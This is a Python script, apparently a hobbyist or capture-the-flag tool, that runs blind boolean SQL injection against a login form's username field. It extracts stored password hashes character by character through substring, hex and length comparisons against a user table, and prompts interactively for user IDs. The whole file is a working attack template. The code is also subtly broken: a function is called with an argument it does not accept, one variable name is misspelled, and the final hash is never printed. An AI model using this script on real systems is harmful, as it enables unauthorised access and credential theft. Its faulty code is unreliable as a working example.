#!/bin/python3
# import nl,pr,ty,pb from '/basic.py'

from pwn import *
import sys
import requests

def nl():
    print('\t')

def pr(a):
    print(a)

#this script can be improved a lot.

pr('This script is interractive.')

if len(sys.argv) != 3:
    pr('./sqlinjection.py <target.com> ,<success_message>')
else:
    count = 0
    charset = '0123456789abcdef'
    target = sys.argv[1]
    success_message = sys.argv[2]

    def injected_query():
        global count
        r = requests.post(target, data={
                        "username": "admin' and {}--".format(payload), "password": "password"})
        count += 1
        return success_message.encode() not in r.content

    def boolean_query(offset, user_id, character, operator='>'):
        payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(
            offset+1, user_id, operator, character)
        return injected_query(payload)

    def invalid_user(user_id):
        payload = "(select id from user where id = {}) >= 0".format(user_id)
        return injected_query(payload)

    def pass_length(user_id):
        i = 0
        while True:
            payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(
                user_id, i)
            if not injected_query(payload):
                return i
            i += 1

    def extract_hash(charset,user_id,password_len):
        found=""
        for i in range(0, password_len):
            for j in range(len(charset)):
                if boolean_query(i,user_id,charse[j]):
                    found += charset[j]
                    break
        return found

    def total_queries_taken():
        global count
        pr("\t\t[!] {} total queries!".format(count))
        count=0

    while True:
        try:
            user_id=input(">> Enter a user ID to extract the password hash: ")
            if not invalid_user(user_id):
                user_pass_length= pass_length(user_id)
                pr("\t [-] User {} hash length: {}".format(user_id,user_pass_length))
                total_queries_taken()
                pr("\t[-] User {} hash: ".format(user_id,extract_hash(charset,int(user_id),user_pass_length)))
                total_queries_taken()
            else:
                pr("\t [x] User {} does not exist!".format(user_id))
        except KeyboardInterrupt:
            break